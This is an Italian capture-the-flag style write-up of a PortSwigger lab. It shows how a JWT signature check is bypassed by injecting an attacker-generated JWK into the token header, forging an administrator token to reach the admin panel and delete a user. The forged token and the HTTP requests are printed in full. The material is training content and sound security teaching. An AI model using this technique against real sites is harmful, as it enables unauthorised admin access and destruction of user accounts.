https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

Colleghiamoci con `wiener:peter`

Il nostro token:

```
eyJraWQiOiI0MWViOTk1Yi0yYTBlLTQzZmMtYjkzZi1jNjQ0OWE1MjMyNDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk1MTc2MSwic3ViIjoid2llbmVyIn0.kZhH19ikKt783IrtqtWpIiKR5NMAQ8I5FQKKdjG23ppgXmZPKCQy2TaVjKLPM4UIQNIUKKy5NgcfBgdMXt8um268fU05LE5I4VV08rk50MQiiANHiH7Hr3fEe-xQURkSn5E6Pi9gN0ix4tTgxX0nkuCGhjX2sJItQv-fwjnEMke5iigbwjku7_YPqPTZLEXb6ZX0c_U8eqzEN8gk5aOJ7uHQL-RVjc3l2GC7yEBJjU4j1rCm6N-g7da3lsyvg8tT6b473LRs47tbyshpBYqSaMiqRzmkPYXAOeZxBJZLer8jv11YfgguGB6X0tPl-58td2SCuB-6G4Sr-gBbrXcg5A
```

analilzziamolo:

```
joshua@kaligra:~$ jwt_tool 'eyJraWQiOiI0MWViOTk1Yi0yYTBlLTQzZmMtYjkzZi1jNjQ0OWE1MjMyNDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk1MTc2MSwic3ViIjoid2llbmVyIn0.kZhH19ikKt783IrtqtWpIiKR5NMAQ8I5FQKKdjG23ppgXmZPKCQy2TaVjKLPM4UIQNIUKKy5NgcfBgdMXt8um268fU05LE5I4VV08rk50MQiiANHiH7Hr3fEe-xQURkSn5E6Pi9gN0ix4tTgxX0nkuCGhjX2sJItQv-fwjnEMke5iigbwjku7_YPqPTZLEXb6ZX0c_U8eqzEN8gk5aOJ7uHQL-RVjc3l2GC7yEBJjU4j1rCm6N-g7da3lsyvg8tT6b473LRs47tbyshpBYqSaMiqRzmkPYXAOeZxBJZLer8jv11YfgguGB6X0tPl-58td2SCuB-6G4Sr-gBbrXcg5A'

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] kid = "41eb995b-2a0e-43fc-b93f-c6449a523245"
[+] alg = "RS256"

Token payload values:
[+] iss = "portswigger"
[+] exp = 1743951761    ==> TIMESTAMP = 2025-04-06 17:02:41 (UTC)
[+] sub = "wiener"

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------

```

...sostituire `wiener` con `administrator` o rimuovere la signature non è sufficiente.

Dobbiamo firmare il token con una chiave che controlliamo noi.

Burp Suite -> JWT Editor -> **New RSA Key**

![](_attachment/Pasted%20image%2020250406162016.png)

Inviamo la richiesta a Repeater, sostituiamo `wiener` con `administrator` e clicchiamo su Attack

![](_attachment/Pasted%20image%2020250406162145.png)

Selezioniamo poi la chiave generata poco fa:

![](_attachment/Pasted%20image%2020250406162214.png)

e inviamo la richiesta:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 6165
```

Nel body troviamo i link per gestire gli utenti

```html
                   <section>
                        <h1>Users</h1>
                        <div>
                            <span>wiener - </span>
                            <a href="/admin/delete?username=wiener">Delete</a>
                        </div>
                        <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
                    </section>
```

inviamo la richiesta per cancellare l'utente `carlos`

```http
GET /admin/delete?username=carlos HTTP/2
Host: 0aad006204ba2cce802fa85c00550043.web-security-academy.net
Cookie: session=eyJraWQiOiIyOWVlNmZhYy02MDQ3LTQzYjYtOWE5MS05NGQxOTk1YWVlOTUiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjI5ZWU2ZmFjLTYwNDctNDNiNi05YTkxLTk0ZDE5OTVhZWU5NSIsIm4iOiIwcVdBNGtlOHBBZHpIOVlTUDBKNGVEY2I3NjViZlM0ZUZqLWhwZ0w0WVFibThKa1EtWVRRaWlzcVlYa2RpMzJqX1pZQnRNdURzekc2RDdmaHFsOUp0dldDUkxjOXhlVzNFU05PYTRfQXhxallmVTM2cFMzOUhLcnA3Z2o1UHc2QzBiYnhfUzRXMVdQR05yZlZwQW9USEZfVHVBbmN3d0VsdWV4aENyak5takFaTTdVT2dySk9aZUhxUEFFMk5RTXh5aXB4VE5mTno0X1pLT1pYWEJjQlJvQ1JfbVB6VG9RUmdXU2xDMVkxTmxfblprdVlNaksyWmE3ZE82ZGw1c2xzcy1CYllVaGk0UGRES3F3bW1LbUxSLW13a1ZQYWx2dm5iVi1md2FVa00tZ1BxZDJaLW9qYWhjc3NKTXZLY1BaN1FLMDdVTTZHOVpISlNTNDZMMGV2c1EifX0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc0Mzk1MTc2MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.UQLWck2JE_4kUGgn9WSKNNBJRJYwkdpJeJj4ssJdi49Psxlebu0u46f8GL8I9Ls-XGEUD3QjTm37cTc5P0F2DgAszpAuSCq6erPzMpLrDS7VD1bYIa6Y1t88R_Zb1SXXos2oslk21-7UnUxUtcF4c7a1LaO1PGDX84p0Erb99nIaLUUgYw0jR9W7FAG_T9A0empmSko_9SW4vVYkWchv-aRRZy6yj9CIDAqvEK0Lp3jmGj7mphj8u0IqCC-AazSTDqlX4ncmEfpkMJc6EBTst8WF-BkRe1lySZlOzi5NbXNMiTAHRCz1yGkoIxRd6gYeaqRaukOZjzoPEybckqiMGA
..
..
..
```

![](_attachment/Pasted%20image%2020250406162424.png)



